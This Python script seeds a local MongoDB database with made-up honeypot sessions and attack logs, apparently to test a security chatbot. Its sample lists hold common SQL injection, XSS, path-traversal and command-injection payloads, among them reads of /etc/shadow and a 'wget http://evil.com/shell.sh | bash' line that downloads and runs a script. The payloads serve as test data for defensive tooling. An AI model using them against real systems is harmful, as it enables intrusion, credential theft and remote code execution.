"""
Populate MongoDB with sample attack data for testing the chatbot
"""
import asyncio
from datetime import datetime, timedelta
from motor.motor_asyncio import AsyncIOMotorClient
import random
import uuid

MONGO_URI = "mongodb://localhost:27017"
DB_NAME = "shadow_guardian"

# Sample attack data
ATTACK_TYPES = ["sql_injection", "xss", "path_traversal", "rce", "lfi", "command_injection"]
IP_ADDRESSES = [
    "192.168.1.105", "10.0.0.55", "203.0.113.42", "198.51.100.23",
    "172.16.0.100", "45.33.32.156", "91.121.87.45", "185.220.101.33"
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "curl/7.68.0",
    "python-requests/2.28.1",
    "sqlmap/1.6.12",
    "Nikto/2.1.6",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
]

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1' --",
    "1; DROP TABLE users; --",
    "admin'--",
    "' UNION SELECT username, password FROM users --",
    "1' AND 1=1 UNION SELECT NULL, table_name FROM information_schema.tables --",
    "'; EXEC xp_cmdshell('whoami'); --"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert(document.cookie)",
    "<body onload=alert('XSS')>"
]

RCE_PAYLOADS = [
    "; cat /etc/passwd",
    "| whoami",
    "`id`",
    "$(cat /etc/shadow)",
    "; wget http://evil.com/shell.sh | bash"
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "/etc/passwd%00.jpg"
]

COMMAND_HISTORY = [
    {"cmd": "whoami", "res": "www-data"},
    {"cmd": "id", "res": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"},
    {"cmd": "uname -a", "res": "Linux honeypot 5.4.0-generic x86_64 GNU/Linux"},
    {"cmd": "cat /etc/passwd", "res": "Permission denied"},
    {"cmd": "wget http://evil.com/miner.sh", "res": "Connection refused (honeypot restriction)"},
    {"cmd": "ls -la /var/www", "res": "total 12\ndrwxr-xr-x 3 root root 4096 html"},
    {"cmd": "ps aux", "res": "USER PID %CPU %MEM COMMAND\nwww-data 1234 0.0 0.1 apache2"},
    {"cmd": "netstat -an", "res": "Connection blocked by honeypot"},
]

async def populate_database():
    client = AsyncIOMotorClient(MONGO_URI)
    db = client[DB_NAME]
    
    logs_collection = db["logs"]
    sessions_collection = db["sessions"]
    
    print("[*] Connected to MongoDB")
    
    # Clear existing data (optional)
    await logs_collection.delete_many({})
    await sessions_collection.delete_many({})
    print("[*] Cleared existing data")
    
    # Generate sessions
    sessions = []
    now = datetime.utcnow()
    
    for i in range(8):
        session_id = str(uuid.uuid4())
        ip = random.choice(IP_ADDRESSES)
        user_agent = random.choice(USER_AGENTS)
        start_time = now - timedelta(hours=random.randint(1, 48), minutes=random.randint(0, 59))
        
        # Generate command history for this session
        num_commands = random.randint(3, 8)
        history = random.sample(COMMAND_HISTORY, min(num_commands, len(COMMAND_HISTORY)))
        
        session = {
            "session_id": session_id,
            "ip_address": ip,
            "user_agent": user_agent,
            "start_time": start_time,
            "active": random.choice([True, False, False]),  # 33% active
            "context": {
                "current_directory": "/var/www/html",
                "user": "www-data",
                "history": history
            }
        }
        sessions.append(session)
    
    await sessions_collection.insert_many(sessions)
    print(f"[+] Created {len(sessions)} sessions")
    
    # Generate attack logs
    logs = []
    
    for session in sessions:
        session_id = session["session_id"]
        ip = session["ip_address"]
        base_time = session["start_time"]
        
        # Generate 5-15 attacks per session
        num_attacks = random.randint(5, 15)
        
        for j in range(num_attacks):
            attack_type = random.choice(ATTACK_TYPES)
            timestamp = base_time + timedelta(minutes=j * random.randint(1, 5))
            
            # Select payload based on attack type
            if attack_type == "sql_injection":
                payload = random.choice(SQL_INJECTION_PAYLOADS)
            elif attack_type == "xss":
                payload = random.choice(XSS_PAYLOADS)
            elif attack_type == "rce" or attack_type == "command_injection":
                payload = random.choice(RCE_PAYLOADS)
            else:
                payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
            
            # Determine ML verdict
            confidence = random.uniform(0.6, 0.99)
            if confidence > 0.85:
                verdict = "MALICIOUS"
            elif confidence > 0.7:
                verdict = "SUSPICIOUS"
            else:
                verdict = "SAFE"
            
            log = {
                "timestamp": timestamp,
                "session_id": session_id,
                "ip": ip,
                "type": random.choice(["http", "command", "api"]),
                "attack_type": attack_type,
                "payload": payload,
                "response": "Blocked by honeypot",
                "ml_verdict": verdict,
                "ml_confidence": round(confidence, 3)
            }
            logs.append(log)
    
    # Add some very recent attacks (last hour) for testing
    for i in range(20):
        attack_type = random.choice(ATTACK_TYPES)
        timestamp = now - timedelta(minutes=random.randint(1, 55))
        
        if attack_type == "sql_injection":
            payload = random.choice(SQL_INJECTION_PAYLOADS)
        elif attack_type == "xss":
            payload = random.choice(XSS_PAYLOADS)
        else:
            payload = random.choice(RCE_PAYLOADS)
        
        confidence = random.uniform(0.75, 0.99)
        
        log = {
            "timestamp": timestamp,
            "session_id": random.choice(sessions)["session_id"],
            "ip": random.choice(IP_ADDRESSES),
            "type": "http",
            "attack_type": attack_type,
            "payload": payload,
            "response": "Blocked by honeypot",
            "ml_verdict": "MALICIOUS" if confidence > 0.85 else "SUSPICIOUS",
            "ml_confidence": round(confidence, 3)
        }
        logs.append(log)
    
    await logs_collection.insert_many(logs)
    print(f"[+] Created {len(logs)} attack logs")
    
    # Show summary
    print("\n[*] Database populated successfully!")
    print(f"    - Sessions: {len(sessions)}")
    print(f"    - Attack logs: {len(logs)}")
    print(f"    - Recent attacks (last hour): 20")
    
    # Show sample queries to try
    print("\n[*] Try these queries in the chatbot:")
    print('    - "Show me all attacks in the last hour"')
    print('    - "What are the top attacking IPs?"')
    print('    - "Show attack distribution by type"')
    print('    - "Find SQL injection attempts"')
    print('    - "Show all active sessions"')
    
    client.close()

if __name__ == "__main__":
    asyncio.run(populate_database())

